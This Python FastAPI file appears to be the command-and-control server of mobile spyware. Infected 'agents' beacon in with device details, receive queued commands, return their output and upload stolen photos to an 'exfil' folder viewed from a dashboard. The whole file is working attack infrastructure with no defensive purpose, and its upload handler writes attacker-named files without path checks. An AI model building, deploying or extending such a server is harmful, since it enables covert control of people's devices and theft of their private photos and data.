from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel
from datetime import datetime
from typing import Optional
import json, os, base64

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

AGENTS_FILE   = "agents.json"
COMMANDS_FILE = "commands.json"
EXFIL_DIR     = "exfil"

os.makedirs(EXFIL_DIR, exist_ok=True)

app.mount("/exfil", StaticFiles(directory=EXFIL_DIR), name="exfil")

# ── helpers ───────────────────────────────────────────────────────────────

def load_agents():
    if not os.path.exists(AGENTS_FILE):
        return {}
    try:
        with open(AGENTS_FILE, "r") as f:
            return json.load(f)
    except json.JSONDecodeError:
        return {}

def save_agents(agents):
    with open(AGENTS_FILE, "w") as f:
        json.dump(agents, f, indent=2)

def load_commands():
    if not os.path.exists(COMMANDS_FILE):
        return {}
    try:
        with open(COMMANDS_FILE, "r") as f:
            return json.load(f)
    except json.JSONDecodeError:
        return {}

def save_commands(commands):
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands, f, indent=2)

def load_results(agent_id: str):
    results_file = f"results_{agent_id}.json"
    if not os.path.exists(results_file):
        return []
    try:
        with open(results_file, "r") as f:
            return json.load(f)
    except json.JSONDecodeError:
        return []

def save_results(agent_id: str, results: list):
    with open(f"results_{agent_id}.json", "w") as f:
        json.dump(results[:50], f, indent=2)


# ── models ────────────────────────────────────────────────────────────────

class BeaconData(BaseModel):
    agent_id: str
    device_model: Optional[str] = "unknown"
    os_version: Optional[str]   = "unknown"
    battery: Optional[int]      = -1

class CommandData(BaseModel):
    agent_id: str
    command: str

class ResultData(BaseModel):
    agent_id: str
    command: str
    output: str

class PhotoData(BaseModel):
    agent_id: str
    filename: str
    data: str  # base64


# ── endpoints ─────────────────────────────────────────────────────────────

@app.post("/sync")
def sync(data: BeaconData):
    agents = load_agents()
    agents[data.agent_id] = {
        "device_model": data.device_model,
        "os_version":   data.os_version,
        "battery":      data.battery,
        "last_seen":    datetime.now().isoformat(),
    }
    save_agents(agents)
    print(f"[+] Beacon from {data.agent_id} | {data.device_model} | battery: {data.battery}%")

    commands = load_commands()
    pending = commands.get(data.agent_id)
    if pending and len(pending) > 0:
        command = pending.pop(0)
        if len(pending) == 0:
            del commands[data.agent_id]
        save_commands(commands)
        print(f"[>] Sending command to {data.agent_id}: {command}")
        return {"status": "ok", "command": command}

    return {"status": "ok", "command": None}


@app.post("/command")
def add_command(data: CommandData):
    commands = load_commands()
    if data.agent_id not in commands:
        commands[data.agent_id] = []
    if len(commands[data.agent_id]) >= 3:
        print(f"[!] Queue full for {data.agent_id}, max 3 commands")
        return {"status": "queue_full"}
    commands[data.agent_id].append(data.command)
    save_commands(commands)
    print(f"[*] Command queued for {data.agent_id}: {data.command} (queue: {len(commands[data.agent_id])}/3)")
    return {"status": "queued"}


@app.post("/result")
def receive_result(data: ResultData):
    all_results = load_results(data.agent_id)
    entry = {
        "command": data.command,
        "output":  data.output,
        "ts":      datetime.now().isoformat(),
    }
    # daca e poza, ataseaza url-ul
    if data.command == "LAST_PHOTO":
        agent_dir = os.path.join(EXFIL_DIR, data.agent_id)
        if os.path.exists(agent_dir):
            photos = sorted(os.listdir(agent_dir))
            if photos:
                entry["photo_url"] = f"/exfil/{data.agent_id}/{photos[-1]}"
    all_results.insert(0, entry)
    save_results(data.agent_id, all_results)
    print(f"[!] Result from {data.agent_id} | {data.command}: {data.output[:80]}")
    return {"status": "ok"}


@app.post("/upload/photo")
def upload_photo(data: PhotoData):
    agent_dir = os.path.join(EXFIL_DIR, data.agent_id)
    os.makedirs(agent_dir, exist_ok=True)
    filepath = os.path.join(agent_dir, data.filename)
    with open(filepath, "wb") as f:
        f.write(base64.b64decode(data.data))
    print(f"[!] Photo received from {data.agent_id} -> saved to {filepath}")
    return {"status": "ok"}


@app.get("/results/{agent_id}")
def get_results(agent_id: str):
    return load_results(agent_id)


@app.get("/agents")
def get_agents():
    return load_agents()

@app.get("/")
def dashboard():
    return FileResponse("dashboard.html")

@app.delete("/results/{agent_id}")
def clear_results(agent_id: str):
    results_file = f"results_{agent_id}.json"
    if os.path.exists(results_file):
        os.remove(results_file)
    print(f"[*] Results cleared for {agent_id}")
    return {"status": "ok"}

@app.delete("/agents")
def clear_agents():
    save_agents({})
    print(f"[*] Agents list cleared")
    return {"status": "ok"}